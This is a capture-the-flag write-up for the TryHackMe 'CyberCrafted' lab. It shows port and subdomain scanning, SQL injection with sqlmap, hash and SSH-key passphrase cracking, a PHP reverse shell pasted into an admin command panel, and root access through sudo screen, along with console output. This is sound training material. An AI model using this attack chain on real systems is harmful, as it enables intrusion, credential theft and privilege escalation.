{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start off by scanning all the ports.")}}

{{console("nmap -T5 -p- 10.10.11.140", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 23:49 CET
Nmap scan report for 10.10.11.140
Host is up (0.087s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://cybercrafted.thm/
|_http-server-header: Apache/2.4.29 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 239.40 seconds")}}

{{text("We discover 3 open ports: ")}}

{{list(['22 (SSH)', '80 (HTTP)', '25565 (minecraft)'])}}

{{text("We visit the website on port 80.")}}

{{text("It redirects us to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cybercrafted.thm</code>, so let's add that entry to our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file.")}}

{{image("../../static/writeups/cybercrafted/images/000001.jpg")}}

{{header("Enumerating subdomains", "enumerating-subdomains")}}

{{text("The question asks if there are any subdomains, let's check for them.")}}

{{console("ffuf -u http://cybercrafted.thm -H 'Host: FUZZ.cybercrafted.thm' -w /usr/share/wordlists/dirb/common.txt -fw 1", "
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cybercrafted.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.cybercrafted.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 77ms]
Admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 77ms]
ADMIN                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 77ms]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 78ms]
www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 72ms]
:: Progress: [4614/4614] :: Job [1/1] :: 520 req/sec :: Duration: [0:00:15] :: Errors: 0 ::")}}

{{text("We find 3 subdomains, <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>admin</code>, <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>store</code> and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>www</code>.")}}

{{text("Now we can add these subdomains to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file and look for the vulnerability from the next question.")}}

{{text("I was enumerating directories on these subdomains and found an interesting looking search form in <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://store.cybercrafted.thm/search.php</code>.")}}

{{text("Let's check if SQL injection is possible using a tool called <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sqlmap</code>.")}}

{{text("I caught a request using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Burp</code> and saved it into a file.")}}

{{text("Let us now run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sqlmap</code> with our request.")}}

{{console("sqlmap -r request.txt --dbs --dump", "
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.11#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | [REDACTED]                               | xXUltimateCreeperXx |
| 4  | THM{[REDACTED]}                          | web_flag            |
+----+------------------------------------------+---------------------+")}}

{{text("We find a flag and a password hash for the user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>xXUltimateCreeperXx</code>.")}}

{{text("By visiting <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>hashes.com</code> we can get the plaintext password.")}}

{{text("With our newly acquired password, we can continue to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://admin.cybercrafted.thm</code> and log in.")}}

{{text("In here is a panel for running system commands.")}}

{{image("../../static/writeups/cybercrafted/images/000002.jpg")}}

{{text("Every command I tried worked, so I tried pasting in a PHP exec reverse shell from <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code>.")}}

{{text("To my surprise, it worked flawlessly, which I did not expect")}}

{{image("../../static/writeups/cybercrafted/images/000003.jpg")}}

{{header("Shell as xxultimatecreeperxx", "shell-as-xxultimatecreeperxx")}}

{{text("I started looking around the file system and noticed something strange.")}}

{{text("I could just... read the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>id_rsa</code> key of user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>xxultimatecreeperxx</code>???")}}

{{image("../../static/writeups/cybercrafted/images/000004.jpg")}}

{{text("This doesn't feel like a medium difficulty machine, but I'm not complaining.")}}

{{text("Let's copy this key and log in as our new user.")}}

{{image("../../static/writeups/cybercrafted/images/000005.jpg")}}

{{text("I could have expected a passphrase. We use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ssh2john</code> on the file, save the output into a file and brute-force the passphrase using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>john</code>.")}}

{{image("../../static/writeups/cybercrafted/images/000006.jpg")}}

{{text("Now we should be able to log in as our new user.")}}

{{header("Shell as cybercrafted", "shell-as-cybercrafted")}}

{{text("Looking through the system, I stumbled upon a flag in <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/opt/minecraft/minecraft_server_flag.txt</code>.")}}

{{text("There was also a note.")}}

{{console("cat note.txt", "Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.")}}

{{text("Going further, we find a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>plugins</code> folder and in it a plugin that the note is probably about, as well as the next question.")}}

{{text("In the folder of the plugin, we find an interesting <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>passwords.yml</code> file, but unfortunately the hash of user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cybercrafted</code> is unbreakable.")}}

{{text("But the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>log.txt</code> file is even more interesting.")}}

{{console("cat log.txt", "[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!                                                                                         
[2021/06/27 11:25:16] cybercrafted registered. PW: [REDACTED]                                                                           
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!                                                                                         
[2021/06/27 11:47:34] cybercrafted logged in. PW: [REDACTED]                                                                            
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!                                                                                         
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!                                                                                                                             
[2021/06/27 11:57:54] cybercrafted logged in. PW: [REDACTED]                                                                                                                 
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!                                                                                                                             
[2021/06/27 11:58:46] cybercrafted logged in. PW: [REDACTED]                                                                                                                 
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!                                                                                                                             
[2021/06/27 11:59:01] madrinch logged in. PW: Password123


[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet LoginSystem!")}}

{{text("Let's check if this user reuses his passwords and try to log in as him.")}}

{{image("../../static/writeups/cybercrafted/images/000007.jpg")}}

{{header("Shell as root", "shell-as-root")}}

{{text("Since I had my user's password, I checked his sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted")}}

{{text("According to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>GTFOBins</code>, we should be able to become root just by using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sudo /usr/bin/screen</code>, but because of the additional parameters it doesn't happen.")}}

{{text("After searching for a little bit, we a thread about the same problem.")}}

{{link("https://stackoverflow.com/questions/4847691/how-do-i-get-out-of-screen-without-typing-exit", "https://cdn.sstatic.net/Sites/stackoverflow/Img/favicon.ico?v=ec617d715196", "How do I get out of 'screen' without typing 'exit'?")}}

{{text("The last comment answers our question.")}}

{{text("We simply press <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Control + A</code> and then <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Control + C</code> to escape.")}}

{{text("Now we simply read the flag.")}}

{{image("../../static/writeups/cybercrafted/images/000008.jpg")}}

{{script()}}
